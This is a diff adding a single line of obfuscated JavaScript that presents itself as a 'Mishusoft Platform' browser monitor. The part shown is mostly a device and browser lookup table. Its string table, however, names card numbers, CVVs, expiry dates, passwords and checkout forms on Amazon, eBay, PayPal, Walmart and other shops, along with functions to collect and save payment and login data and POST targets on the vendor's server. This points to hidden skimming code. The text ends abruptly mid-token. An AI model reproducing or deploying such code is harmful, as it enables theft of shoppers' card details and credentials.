@@ -1,1 +1,5563 @@
-const a8_0x1818=['Bing\x20Preview\x20Snapshot\x20Generator','3.10','forEach','cardExpiryDate','SalamWeb','identi','one-step-checkout-form','Mishusoft\x20Platform\x20is\x20a\x20robust\x20multi-web\x20platform\x20developed\x20by\x20Mishusoft\x20Systems\x20Inc.\x20This\x20platform\x20is\x20capable\x20of\x20getting\x20your\x20work\x20done\x20quickly\x20and\x20accurately.','July\x2022,\x202020','PaleMoon\x20Browser','code','Opera\x20Mini','#ccHolder','expirationDate','1st\x20Browser','paygate','logon','September\x209,\x202014','Beaker','1\x20January\x202019','stringify','SeaMonkey\x20Browser','cardNo','cdnUrl','2245rNrQvc','attributes','https://astian.org/en/midori-browser/','creditCardNumber','Dillo','AIX','trim','.title-to-detail','addEventListener','Sanyo','New\x203DS','May\x205,\x202020','length','radio','msu','June\x2018,\x202020','#ccSecurityCode','#ccExpirationYear','tag','phpmyadmin','Unlimited\x20Pro','dash.fembed.com','0.11.0','setRequestHeader','getURLHostname','The\x20Chromium\x20Project','.btn.btn--primary.field','PlayStation\x20Vita','https://en.wikipedia.org/wiki/Brave_(browser)','application/json;charset=UTF-8','recherche','Danger\x20Hiptop','login','nodeName','header','2020.10.10','The\x20GNOME\x20Project','getBrowserAppCodeName','13\x20September\x202020','card-no','2.0.7','keyup','version','finecobank','CountryDDL','amazon','browserName','FreeMiNT\x20OS','verifyFormElement','querySelectorAll','credit-card-details','Active','Ubuntu\x20OS','(as\x20of\x203.0)','SEOkicks','Windows\x20Longhorn','April\x2022,\x202020','csc','browserAppNameFull','.ReactModalPortal','32\x20Bit','May\x2010,\x202016','PayPageForm','Nintendo\x20Switch','none','https://en.wikipedia.org/wiki/Blink_(web_engine)','gerDeviceScreenPixelDepth','Opera\x20Software','getDeviceWindowManager','Card\x20Number','https://en.wikipedia.org/wiki/Google','1.20','pay-name','nodeValue','2.53.4','https://en.wikipedia.org/wiki/GNU_General_Public_License','VERSION','86.0.4240.111','HP-UX','NSZ-GS7/GX70','65.0.2.15','Blink.','aliexpress','getDeviceType','sessionStorage','split','May\x2026,\x202020','O2\x20Cocoon','self','hidden','.arrow-content','March\x2013,\x202020','GPL\x203.0','Naver\x20Corporation','exploreWalmartPaymentEditButton','FREE\x20SAS.','styledform','Yahoo!\x20Slurp\x20Web\x20Crawler\x20Bot','getBrowserAppVersion','SSLForm','Windows\x20CE','Welcome\x20to\x20Mishusoft\x20Platform','btnConfirmPayment','payment-option','name','https://api.ipdata.co/?api-key=2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180','Car','74.0.3850.0','https://en.wikipedia.org/wiki/GitHub','Web\x20Browser','https://www.comodo.com/home/browsers-toolbars/internet-products.php','webBrowserList','Vario','Galeon\x20Browser','AddressInput','Macintosh,','devicesList','.edit-form.multiple-required','3.38.1','1DtGaEV','text','file','Linux\x20Desktop,','https://www.mishusoft.com/','2020.10','Windows\x20XP','10.0','ng-pristine','kreditrechner','DeviceScreenWidth','https://www.microsoftedgeinsider.com/en-us/','1.5.4.2','reg','commande','string','explorePayPalPaymentFormElement','Wii','getUserAgent','safari\x20Browser','http://localhost/','sign','#cvv2','Sony\x20Ericsson','10.1.5','OpenSite\x20Explorer\x20Crawler','data','cardPostalCode','processAliExpressPaymentNewCard','FullTextMode','user','https://en.wikipedia.org/wiki/Flock_(web_browser)','March\x2030,\x202017','number','007ac9\x20Crawler','DSi','Device','collectPaymentData','Oracle','H96\x20Pro+','exploreSpecificElementByTagName','https://en.wikipedia.org/wiki/Servo_(software)','async','JAVA','\x09Free','NetSurf\x20Browser','Xbox\x20One','getURLPathFull','explorePaymentInputTag','#perkreditkarte','https://en.wikipedia.org/wiki/Qt_WebEngine','July\x202020','Yandex\x20Browser','Microsoft\x20Corp','Otter\x20Browser','DEC\x20OSF','challenge','Windows\x20NT','Flock\x20Inc','Treo','iceweasel','url','keydown','cardn','.card-form','115\x20Team','aria-label','URLPath','passwordStore','processAliExpressPaymentNewCardOnSecondPayment','https://en.wikipedia.org/wiki/Yandex','getBrowserArchitecture','amex','cleanUserAgentString','October\x2025,\x202019','bhlf','picker','7\x20June\x202018','visa','action','11.4.4','exploreAnchorOnly','mac','TodaysChargeDDL','#/payment','June\x2030,\x202020','PhoneNumberInput','Yandex','Client\x20URL','.button.link.CXO_module_header_edit_button.button--link','Included\x20with\x20macOS\x20and\x20iOS','July\x2031,\x202020','America\x20Online,\x20Inc','Tasman','http://www.netsurf-browser.org/','https://www.mishusoft.com/payment/donate','toLowerCase','innerHTML','https://en.wikipedia.org/wiki/Apple_Inc.','form-paymentmethods-credit_card','Amaya','Stefan\x20Burstroem','https://en.wikipedia.org/wiki/Trialware','bill','classicTrackAuthEvent','.new-card','1\x20Password','Majestic-12\x20Distributed\x20Search\x20Bot','form','Playstation\x20Portable','Nintendo\x203DS','Montulli,\x20Grobe,\x20Rezac,\x20et\x20al','Nintendo.','2345\x20Explorer','cardN','creditCard','Edg','Sony.','deviceType','Commodore\x20International','Television','INRIA','https://www.w3.org/','WebTV','exclude','59.1.2926.54067','David\x20Rosca','2020\x20build\x203','https://beakerbrowser.com/about','browserAppName','Tasman/xyz','Error::\x20Your\x20browser\x20does\x20not\x20support\x20session!!\x20Please\x20upgrade\x20or\x20change\x20your\x20browser!!','20.6.2.318','deviceNameFull','height','Nintendo\x20Browser','call','encrypted','#PIN','body','Debian','August\x2027,\x202018','DeviceScreenPixelDepth','Qt\x20Web\x20Engine\x20based\x20browser','27\x20September\x202010','creditCardRuntimeCvc','0.8.10','setItem','https://en.wikipedia.org/wiki/Mozilla_Public_License','Mac\x20OS\x209','ZTE','Viera\x20TV','ShySky.','Linux\x20Foundation','https://en.wikipedia.org/wiki/V8_(JavaScript_engine)','change','Windows\x20Window\x20Manager.','June\x2019,\x202019','Windows\x20NT\x204.0','3.5.3.4641','push','getWebBrowserList','browserAppCodeName','libwww-FM/xyz','Tesla\x20Car\x20Browser','GET','SeaMonkey\x20Council','textContent','2.8.9rel.1','NTT\x20DoCoMo','content','NEC','msie','new_user','crawlAuthFormElement','#email_login','7.4.767','https://en.wikipedia.org/wiki/Gecko_(layout_engine)','weekly333','tel','86.0.4240.114','.card-type-icon.icon','#checkout-button','nav-searchbar','account/creditcards','1337\x20Browser','button','Mobile\x20Explorer','application/json','dblclick','browserInfoAll','Mozilla\x20Foundation','Mishusoft\x20Systems\x20Incorporate.','iCab\x20Browser','analyze','Chrome\x20OS','.verify-card-form-row','Browser.','April\x2027,\x202020','saveBankAccountData','4.5','app_form','Symbian','1.0.01','pass','trigger','GNU/Linux','exploreDocmorrisPaymentContainer','Qwantify','#conferma_email_certifCommand','Switch','num','March\x2019,\x202019','location','webBrowserAppCodeNameList','display','Linux','error','getDeviceList','October\x2020,\x202020','#ccNumber','1.0.2','workWebsite','Windows\x2010','S60\x2012.0.22','Blue\x20Link\x20Labs','5.1.60','May\x2010,\x202019','cardNumber','Goanna/xyz','form1','account_holder_name','getDeviceNameFull','creditCardStore','payment-inactive','1CxLRiA','7.73.0','u_0_','Windows\x203.11','json','www.srware.net/en/software_srware_iron.php','Limited','browserVersion','classList','discover','wpcf7-form','https://en.wikipedia.org/wiki/KDE','saveLoginData','ELinks','TermsConditionsPrivacyInput','#cardExpirationYear','2\x20August\x202020','cardholder','http://localhost/payment/','resolveAuthEvent','Windows\x2095','https://www.mishusoft.com/payment/','SymbianOS','send','Amiga\x20OS','Free','https://en.wikipedia.org/wiki/Daniel_Stenberg','2.7.100.20','Flock','URLProtocol','getBrowserInfoAll','explorePaymentSelectTag','paypal','Windows\x202000','official','Camino','360\x20Secure\x20Browser','mobi','confirm_order.htm','Yahoo\x20LLC','https://en.wikipedia.org/wiki/Proprietary_software','formData','win','walmart','btn-link','https://www.gnome.org/news/2015/05/goodbye-marco/','register','The\x20NetSurf\x20Developers','Comodo\x20Dragon','Sony','UserAgent','explorePaygatePaymentFormElement','September\x2017,\x202020','mollie','jobboerse.com','CheckMark','addcard','Freebox\x20Revolution','checkform','convert-form','Amoi','71.0.3770.271','Blisk\x20team','PlayStation\x20Portable','https://en.wikipedia.org/wiki/Naver_Corporation','username','16\x20October\x202020','Microsoft','MPL\x201.1','Yandex\x20Search\x20Bot','signin','getDeviceArchitecture','Trialware','DeviceScreenColorDepth','7.5.1','78.4.0','expirationYear','lastName','Panasonic','oppwa.com','getItem','GitHub','Arch\x20Linux','Unknown','MDA','BlackBerry','#ccExpirationMonth','Free\x20Software:\x20MIT/X\x20derivate\x20license','cvv','https://www.chromium.org/','exploreAnchorOnlyByHref','8\x20October\x202020','Trident','bit_exchange_form','click','Linux\x20Desktop','https://en.wikipedia.org/wiki/BSD_licenses','getBrowserName','brand','origin','#/review','absoluteTrack','browserEngineVersion','POST','saveInputElementData','Mail.ru\x20Crawler','Series\x20J\x20(2016)','Commodore','creditCardRuntimeBrand','cardHolder','Qt\x20WebEngine','upload','http://localhost/monitor/browser/','command','2.1.2','1.38.0','AdScanner','LGPL','Content-type','Benjamin\x20C.\x20Meyer','Windows\x208','Generic\x20Mobile','search','input','https://en.wikipedia.org/wiki/Opera_Software','presentation','.payment-edit','20.7.2','jsonData','Computer','creditCardRuntimeHolderName','https://en.wikipedia.org/wiki/Links_(web_browser)','method','googleads','replace','exploreEbayPaymentFormElement','exploreMolliePaymentFormElement','LanguageDDL','explorePaymentNewCard','built\x20nightly','creditCardRuntimeNumber','Servo','deviceInfoAll','WebKit.','Xiino','custom','Amiga','#creditCardNum','Marco\x20Pesenti\x20Gritti','exploreMolliePaymentContainer','2345\x20Chrome','types','credit-card','HP\x20iPaq','monitor/browser/','298WBIDkq','event','BSD\x20(Chromium\x20executable)\x20(some\x20closed-source\x20features)','Raspbian\x20Pi','5.4.5','Gecko/xyz','webBrowserLayoutList','VAP430','cooperatively\x20by\x20Mozilla\x20and\x20Samsung','exploreSegPayPaymentContainer','KDE','creditCardRuntimePostalCode','clear','Mac\x20OS\x20X','1.5.0','firefox','expire','type','expires','UserAgentList','Unknown\x20','GET_PAYMENT_INSTRUMENT','getPlatformWMNameList','DeviceScreenHeight','32-bit','Panasonic.','Google\x20Chrome','Avant\x20','SPV','January\x2025,\x202019','cardHolderFirstName','28.15.0','mainf','libwww-FM','The\x20application\x20is\x20ready\x20to\x20be\x20installed\x20on\x20your\x20device\x20at\x20this\x20time.','15\x20October\x202020','Qwantify\x20Search\x20Crawler','getAttribute','Alfawise.','88.0.673.0','data-test-id','84.0.4300.0','KDL32CX525','Haiku\x20OS','MegaIndex.ru','Blink','securityCode','KDE\x20project','cardno','childElementCount','Dooble','getDeviceWmNameOriginal','GPLv3','Gecko\x20w/Servo','saveNavigateData','wp-link','browserVersionFull','Avant\x20Force','creditCardRuntimeExpireDate','https://chromium.woolyss.com/','dataValue','SEOkicks\x20Crawler','ctl23','querySelector','exploreBestSecretPaymentContainer','27\x20September\x202008','placeholder','opera','EMailInput','devicesCategoryList','Apple\x20Inc.','MIT\x20License','June\x208,\x202016','3DS','1004131yGgHcb','holder','IBrowse','16\x20Bit','https://en.wikipedia.org/wiki/KHTML','.bind-button-wrap','Windows\x208.1','architecture','childNodes','19FNjQuO','Windows\x20Phone\x207','isTrackerActivate','getDeviceNameOriginal','index.php','docmorris','Ahrefs','Playstation\x203','CVV','Alex\x20Kontos','getDeviceInfoAll','64\x20Bit','SPAN','exploreAliExpressPaymentNewCard','authEvent','WebKitGTK','add-payment-method-save','143BFOVDY','checkoutshopper-live.adyen.com','select','https://salamweb.com/','firstName','Brave\x20Software\x20Inc','LG.','BeOS','Canonical\x20Inc','getPlatformName','20.6.3.54','2.2.0','2345\x20Browser','Majestic','Apple\x20iPod\x20Touch','Dooble\x20Project\x20Team','.verify-card-confirm','password','submit','getBrowserAppCodeNameFull','Platform','form--1G_Qn','Tesla','Trident/xyz','Obigo','https://web.archive.org/web/20110325151017/http://www.flock.com/','select-one','getDevicesCategoryList','27\x20October\x202020','cardHolderLastName','FreeBSD\x20Foundation','exploreDocmorrisPaymentFormElement','custom,\x20fork\x20of\x20libwww','gerDeviceScreenColorDepth','dataType','firstElementChild','defineProperty','Electron','credit','download','Goanna','Palm','Playstation\x204','3.37.92','cardBrand','24\x20October\x202020','captcha','absoluteTrackHelper','Moonchild\x20Productions','SEMrush','Philips.','Amazon.com,\x20Inc.','LGPL\x20(WebKit)','exports','June\x2020,\x202020','Mozilla','className','1.15.75','isArray','cvc','getBrowserEngineNameFull','February\x201,\x202011','Vizio.','DIV','NOT\x20SET','Desktop','registration','value','https://en.wikipedia.org/wiki/Libwww','currentDeviceInfo','W3C','Console','XDA','85.0.4350.0','Windows\x2098','jss','Chrome','null','mnp','.floating-input__fixright','FTP\x20client\x20/\x20HTTP\x20client','getBrowserAppCodeVersion','segpay','Google','.mix-edcard-item','btn-secondary-action','data-txnid','getCurrentDeviceInfo','Nintendo','exploreEbayPaymentDataCollection','devicesArchitectureList','Chromecast','exploreBestSecretPaymentFormElement','BUTTON','encryptedSecurityCode','payment','getDeviceName','Irix','backupScripts','Accept','007ac9','Novarra\x20Transcoder','https://en.wikipedia.org/wiki/Dooble','iPad','32\x20bit','Sony\x20PSP','MSN\x20Bot','https://en.wikipedia.org/wiki/WebKitGTK','Googlebot\x20Crawler','sslform','Comodo\x20Group','5.3.8.2000','3.6.3','Sharp','saveLogoutData','ZipInput','14\x20October\x202020','add','email','Windows\x20Phone','https://en.wikipedia.org/wiki/Mozilla_Foundation','exploreAmazonPaymentFormElement','ebay','14\x20March\x202012','5.2.3.3241','Ubuntu','https://en.wikipedia.org/wiki/GNU_Lesser_General_Public_License','data-automation-id','Arora','Netbox','.css-iro1ss-IconContainer.e7vozvz0','getPlatformArchitecture','Basilisk\x20','URLPathFull','MPL\x202.0','object','25\x20September\x202020','Proprietary\x20(browser)','Error:\x20METHOD\x20and\x20URL\x20empty.','Windows\x202003','https://en.wikipedia.org/wiki/MIT_License','#login','.cic-module','LGPL\x20(WebKit)\x20','OpenBSD','gerDeviceScreenWidth','Opera','devicesPlatformWMNameList','phone','.wallet_payment_options.two-column-layout-wallet-payment-options','support@mishusoft.com','489485rqNdIf','deviceWmNameOriginal','Christian\x20Dywan,\x20et\x20al.','URLHostname','Windows\x20Phone\x208','https://www.dillo.org/','paste','checkbox','icon','Michał\x20Dutkiewicz','IpInfo','meta','BSD','exploreWalmartPaymentContainer','Edge/xyz','bestsecret.com','crawlPaymentFormElement','https://en.wikipedia.org/wiki/W3C_Software_Notice_and_License','myaccount/money','https://en.wikipedia.org/wiki/Freeware','.payment-confirm','Tesla\x20Motors.','https://www.mishusoft.com/monitor/browser/','browserEngineName','payResult.htm','.card-brand-icon','2.21','WebKit','.edit-card','month-chooser','fork\x20of\x20Links','82.0','wallet','PIN','#root','August\x2029,\x202020','Chromium\x20Browser','EdgeHTML','Opera/xyz','deviceName','hellofresh.de','SELECT','https://en.wikipedia.org/wiki/Trident_(layout_engine)','https://en.wikipedia.org/wiki/WebKit','webapps','suche','Macintosh','Proprietary','parse','getBrowserVersion','trackerJobId','log','track','Lynx','https://en.wikipedia.org/wiki/Blink_(layout_engine)','getBrowserAppCodeNameList','year','cardCVC','Brave\x20Browser','Chrome/xyz','ignore','manjaro','retrieveAccurateData','card-bottom','Google\x20Inc','FreeBSD','Openwave\x20Browser','2rXmXkR','subscribe','Unknown/','AppleWebKit/xyz','SEO\x20Scanners\x20Crawler\x20Bot','AppleTV','.save','GraphicalMode','explorePaymentInputTagOnly','https://www.clauss-net.de/','pathname','12739mSMcjy','22\x20August\x202009','Fire\x20TV','5.9.2','Sagem','Server','Car\x20Entertainment\x20Framework','1159852HezSgv','card-surface','#firstName','QtWebKit','keys','Playstation\x20Browser','Presto.','ApacheBench','Nintendo\x20DSi','Symbian\x20S60','https://en.wikipedia.org/wiki/Maxthon','Gecko','Apple\x20Inc','getBrowserEngineName','October\x2022,\x202020','Crawler','Links','Midori\x20Browser','KHTML','explorePaygatePaymentContainer','pixelDepth','Tesla\x20Motors','.check-out-root','July\x2021,\x202020','698986SagTrb','owner','Fetching\x20error.','Microsoft.','CheckMark\x20Network\x20Crawler','11.0.0-beta.16','explorePaymentSpanTag','discontinued','SRWare','BSDi','constructor','Digital\x20Paths','init','elementsapp','INPUT','generate','colorDepth','maestro','https://curl.haxx.se/docs/copyright.html','Power\x20PC\x20Mac','opr','1.15.73','logout','Samsung','October\x2029,\x202020','creditcard','resolvePaymentEvent','exploreHelloFreshPaymentContainer','browserAppVersion','MX\x20Enjoy\x20TV\x20BOX','https://en.wikipedia.org/wiki/Goanna_(software)','remove','.edit-form-actions','Raspberry\x20Pi\x20Foundation','indexOf','pay','browserEngineNameFull','browserUserDataManagement','deviceArchitecture','October\x2010,\x202020','getBrowserNameFull','Ahrefs\x20Backlink\x20Research\x20Bot','browserNameFull','browserArchitecture','https://en.wikipedia.org/wiki/The_GNOME_Project','exploreAmazonPaymentContainer','Mail\x20RU','exploreSegPayPaymentFormElement','64/32\x20bit','KHTML/xyz','matchkalender','InputElementDataRecord','June\x2029,\x202019','Apple\x20iPhone','March\x204,\x202020','arrow-down','contains','sunday','.card-types','https://en.wikipedia.org/wiki/Trident_(software)','mozilla','14.0','v57\x20&\x20after','securitycode','getBrowserAppName','Alcatel','wam_arten','TextBasedMode','21\x20October\x202020','exploreSundayPaymentContainer','HTC','savePaymentMethodsData','DA\x20241HL','652tpqaYc','readyState','mastercard','#mishusoft-web-root','screen','Maxthon\x20Browser','visitor','exploreSundayPaymentFormElement','#lastName','cardExpire','January\x2018,\x202012','href','2.53.5b1','navigate','settings','Palmscape','.add-new-card','Samsung.','signon','mishusoft','VoilaBot\x20BETA','width','GPL'];function a8_0x2c8e(_0x3e2442,_0x515da7){return a8_0x2c8e=function(_0x181856,_0x2c8e45){_0x181856=_0x181856-0x1f4;let _0x576289=a8_0x1818[_0x181856];return _0x576289;},a8_0x2c8e(_0x3e2442,_0x515da7);}(function(_0x50716e,_0x226305){const _0x38e30b=a8_0x2c8e;while(!![]){try{const _0x1058f0=parseInt(_0x38e30b(0x2bf))+parseInt(_0x38e30b(0x3c5))*parseInt(_0x38e30b(0x4cc))+parseInt(_0x38e30b(0x3be))*-parseInt(_0x38e30b(0x2c8))+-parseInt(_0x38e30b(0x426))*parseInt(_0x38e30b(0x2d9))+-parseInt(_0x38e30b(0x455))*parseInt(_0x38e30b(0x275))+parseInt(_0x38e30b(0x3b3))*-parseInt(_0x38e30b(0x370))+-parseInt(_0x38e30b(0x3dd))*-parseInt(_0x38e30b(0x5b7));if(_0x1058f0===_0x226305)break;else _0x50716e['push'](_0x50716e['shift']());}catch(_0x3aed4c){_0x50716e['push'](_0x50716e['shift']());}}}(a8_0x1818,0xd6c60),(()=>{'use strict';const _0x2d889a=a8_0x2c8e;var _0x1eaf90={0x21a:(_0x3c2627,_0x3752a0,_0x1f9e15)=>{const _0x4f9c7e=a8_0x2c8e;_0x1f9e15['d'](_0x3752a0,{'A':()=>_0x182b70});class _0x182b70{[_0x4f9c7e(0x4a1)]=_0x4f9c7e(0x5a9);[_0x4f9c7e(0x454)]='';['UserAgent']=navigator['userAgent'];[_0x4f9c7e(0x483)]='Unknown';['browserNameFull']=_0x4f9c7e(0x22d);[_0x4f9c7e(0x5be)]=_0x4f9c7e(0x22d);['browserVersionFull']=_0x4f9c7e(0x22d);['browserArchitecture']='Unknown';[_0x4f9c7e(0x54d)]=_0x4f9c7e(0x22d);[_0x4f9c7e(0x48f)]=_0x4f9c7e(0x22d);['browserAppVersion']='Unknown';[_0x4f9c7e(0x56e)]=_0x4f9c7e(0x22d);['browserAppCodeVersion']='Unknown';[_0x4f9c7e(0x387)]=_0x4f9c7e(0x22d);[_0x4f9c7e(0x401)]=_0x4f9c7e(0x22d);[_0x4f9c7e(0x240)]='Unknown';[_0x4f9c7e(0x58a)]=[];[_0x4f9c7e(0x397)]=_0x4f9c7e(0x22d);[_0x4f9c7e(0x542)]=_0x4f9c7e(0x22d);['deviceArchitecture']=_0x4f9c7e(0x22d);['deviceWindowManager']=_0x4f9c7e(0x22d);['deviceInfoAll'];['deviceNameFull'];['deviceNameOriginal']=_0x4f9c7e(0x22d);[_0x4f9c7e(0x371)]=_0x4f9c7e(0x22d);['currentDeviceInfo'];[_0x4f9c7e(0x1f7)]=window[_0x4f9c7e(0x5a1)]['protocol'];[_0x4f9c7e(0x373)]=window[_0x4f9c7e(0x5a1)]['hostname'];[_0x4f9c7e(0x50f)]=window[_0x4f9c7e(0x5a1)][_0x4f9c7e(0x3bd)];[_0x4f9c7e(0x35e)]=window['location'][_0x4f9c7e(0x431)];['DeviceScreenWidth']=window[_0x4f9c7e(0x42a)][_0x4f9c7e(0x43b)];['DeviceScreenHeight']=window[_0x4f9c7e(0x42a)][_0x4f9c7e(0x552)];[_0x4f9c7e(0x223)]=window[_0x4f9c7e(0x42a)][_0x4f9c7e(0x3ed)];[_0x4f9c7e(0x55a)]=window[_0x4f9c7e(0x42a)][_0x4f9c7e(0x3d9)];[_0x4f9c7e(0x288)];['devicesList'];['devicesCategoryList'];[_0x4f9c7e(0x333)];[_0x4f9c7e(0x36c)];['webBrowserList'];[_0x4f9c7e(0x27b)];['webBrowserAppCodeNameList'];constructor(){const _0x2f793a=_0x4f9c7e;this[_0x2f793a(0x4c9)]={'3DS':{'Browser':{'name':_0x2f793a(0x553),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x331),'rendering\x20engine':'WebKit.','type':_0x2f793a(0x591)},'Platform':{'name':'Nintendo\x203DS','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x331)},'Device':{'name':_0x2f793a(0x2be),'type':_0x2f793a(0x320),'vendor':_0x2f793a(0x331),'brand':_0x2f793a(0x331)}},'DSi':{'Browser':{'name':'Nintendo\x20Browser','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x331),'rendering\x20engine':_0x2f793a(0x3cb),'type':_0x2f793a(0x591)},'Platform':{'name':_0x2f793a(0x3cd),'architecture':'32-bit','developer':_0x2f793a(0x331)},'Device':{'name':_0x2f793a(0x4ef),'type':_0x2f793a(0x320),'vendor':_0x2f793a(0x331),'brand':_0x2f793a(0x331)}},'New\x203DS':{'Browser':{'name':_0x2f793a(0x553),'architecture':'32-bit','developer':_0x2f793a(0x331),'rendering\x20engine':_0x2f793a(0x269),'type':_0x2f793a(0x591)},'Platform':{'name':_0x2f793a(0x53a),'architecture':'32-bit','developer':_0x2f793a(0x331)},'Device':{'name':_0x2f793a(0x45f),'type':_0x2f793a(0x320),'vendor':_0x2f793a(0x331),'brand':_0x2f793a(0x331)}},'Playstation\x20Portable':{'Browser':{'name':_0x2f793a(0x342),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x20b),'type':_0x2f793a(0x591)},'Platform':{'name':_0x2f793a(0x4f7),'architecture':_0x2f793a(0x28d),'developer':'Oracle'},'Device':{'name':_0x2f793a(0x539),'type':'Console','vendor':_0x2f793a(0x20b),'brand':_0x2f793a(0x20b)}},'PlayStation\x20Vita':{'Browser':{'name':_0x2f793a(0x3ca),'developer':_0x2f793a(0x20b),'rendering\x20engine':_0x2f793a(0x269),'type':_0x2f793a(0x591)},'Platform':{'name':_0x2f793a(0x470),'developer':_0x2f793a(0x4f2)},'Device':{'name':'PlayStation\x20Vita','type':_0x2f793a(0x320),'vendor':_0x2f793a(0x20b),'brand':_0x2f793a(0x20b)}},'Switch':{'Browser':{'name':_0x2f793a(0x553),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x331),'rendering\x20engine':_0x2f793a(0x269),'type':_0x2f793a(0x591)},'Platform':{'name':_0x2f793a(0x494),'architecture':'32-bit','developer':_0x2f793a(0x331)},'Device':{'name':_0x2f793a(0x59e),'type':_0x2f793a(0x320),'vendor':_0x2f793a(0x331),'brand':_0x2f793a(0x331)}},'Amiga':{'Browser':{'name':_0x2f793a(0x2c1),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x531),'type':'Browser.'},'Platform':{'name':_0x2f793a(0x5cf),'architecture':_0x2f793a(0x28d),'developer':'Commodore\x20International'},'Device':{'name':_0x2f793a(0x26c),'type':_0x2f793a(0x31a),'vendor':_0x2f793a(0x543),'brand':_0x2f793a(0x245)}},'DA241HL':{'Browser':{'name':_0x2f793a(0x325),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x3b0),'type':_0x2f793a(0x591)},'Platform':{'name':'Android','architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x3b0)},'Device':{'name':_0x2f793a(0x425),'type':'Desktop','vendor':'Acer','brand':'Acer'}},'tesla':{'Browser':{'name':_0x2f793a(0x570),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x385),'rendering\x20engine':'Blink.','type':_0x2f793a(0x591)},'Platform':{'name':'Linux','architecture':'32-bit','developer':_0x2f793a(0x565)},'Device':{'name':_0x2f793a(0x4bf),'type':_0x2f793a(0x3c4),'vendor':'Tesla\x20Motors','brand':_0x2f793a(0x2ef)}},'QtCarBrowser':{'Browser':{'name':_0x2f793a(0x570),'architecture':'32-bit','developer':_0x2f793a(0x385),'rendering\x20engine':_0x2f793a(0x4a6),'type':'Browser.'},'Platform':{'name':_0x2f793a(0x5a4),'architecture':'32-bit','developer':_0x2f793a(0x565)},'Device':{'name':_0x2f793a(0x4bf),'type':_0x2f793a(0x3c4),'vendor':_0x2f793a(0x3da),'brand':_0x2f793a(0x2ef)}},'freebsd':{'Platform':{'name':_0x2f793a(0x3b1),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x2f7)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x239)}},'CrOS':{'Platform':{'name':_0x2f793a(0x58f),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x3b0)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'Ubuntu':{'Platform':{'name':_0x2f793a(0x489),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x2e1)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x239)}},'Arch\x20Linux':{'Platform':{'name':_0x2f793a(0x22c),'architecture':'32-bit','developer':_0x2f793a(0x22c)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x239)}},'linux':{'Platform':{'name':_0x2f793a(0x5a4),'architecture':'32-bit','developer':_0x2f793a(0x565)},'Device':{'name':_0x2f793a(0x25b),'type':'Linux\x20Desktop'}},'debian':_0x2f793a(0x558),'manjaro':_0x2f793a(0x3ad),'sunos':'Sun\x20Solaris','beos':_0x2f793a(0x2e0),'apachebench':_0x2f793a(0x3cc),'aix':_0x2f793a(0x45a),'irix':_0x2f793a(0x33a),'osf':_0x2f793a(0x503),'hp-ux':_0x2f793a(0x4a3),'netbsd':'NetBSD','bsdi':_0x2f793a(0x3e6),'openbsd':_0x2f793a(0x369),'gnu':_0x2f793a(0x59a),'unix':'Unknown\x20Unix\x20OS','ubuntu':_0x2f793a(0x356),'RISC\x20OS':'RISC\x20OS','Darwin':'MAC\x20OS','Haiku':_0x2f793a(0x2a0),'FreeMiNT':_0x2f793a(0x484),'windows\x20phone\x208':{'Platform':{'name':_0x2f793a(0x374),'architecture':_0x2f793a(0x28d),'developer':'Microsoft\x20Corp'},'Device':{'name':'Windows\x20Phone','type':'phone'}},'windows\x20phone\x20os\x207':{'Platform':{'name':_0x2f793a(0x2c9),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x350),'type':_0x2f793a(0x36d)}},'windows\x20nt\x2010':{'Platform':{'name':_0x2f793a(0x5ab),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'windows\x20nt\x206.3':{'Platform':{'name':_0x2f793a(0x2c5),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':'Computer','type':_0x2f793a(0x31a)}},'windows\x20nt\x206.2':{'Platform':{'name':_0x2f793a(0x252),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'windows\x20nt\x206.1':{'Platform':{'name':'Windows\x207','architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'windows\x20nt\x206.0':{'Platform':{'name':_0x2f793a(0x48c),'architecture':_0x2f793a(0x28d),'developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'windows\x20nt\x205.2':{'Platform':{'name':_0x2f793a(0x364),'architecture':_0x2f793a(0x28d),'developer':'Microsoft\x20Corp'},'Device':{'name':_0x2f793a(0x25b),'type':'Desktop'}},'windows\x20nt\x205.1':{'Platform':{'name':'Windows\x20XP','architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':'Computer','type':_0x2f793a(0x31a)}},'windows\x20xp':{'Platform':{'name':_0x2f793a(0x4d2),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':'Desktop'}},'windows\x20nt\x205.0':{'Platform':{'name':_0x2f793a(0x1fb),'architecture':'32-bit','developer':'Microsoft\x20Corp'},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'windows\x20me':{'Platform':{'name':'Windows\x20ME','architecture':_0x2f793a(0x28d),'developer':'Microsoft\x20Corp'},'Device':{'name':'Computer','type':_0x2f793a(0x31a)}},'windows\x20nt\x204.0':{'Platform':{'name':_0x2f793a(0x56a),'architecture':'32-bit','developer':_0x2f793a(0x501)},'Device':{'name':_0x2f793a(0x25b),'type':_0x2f793a(0x31a)}},'winnt4.0':{'Platform':{'name':_0x2f